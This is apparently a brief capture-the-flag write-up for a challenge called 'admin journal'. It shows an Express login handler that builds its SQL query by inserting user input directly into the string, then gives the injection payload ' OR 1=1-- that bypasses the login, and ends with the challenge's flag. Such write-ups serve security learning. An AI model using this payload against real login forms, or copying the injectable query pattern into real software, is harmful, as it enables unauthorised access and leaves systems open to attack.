# admin journal

## Challenge

Bypass the admin login to read the flag from the database.

## Walkthrough

```js
app.post('/login', (req, res) => {
    // ...
    const query = `SELECT * FROM users WHERE
        username = '${req.body.username}' AND
        password = '${req.body.password}'`;
    // ...
```

Trivial SQLI.

```sql
-- password: ' OR 1=1--

SELECT * FROM users WHERE
    username = 'admin' AND
    password = '' OR 1=1--
```

## Solve

`maple{ess_skew_el_inject10nz_are_pr3tty_fun}`
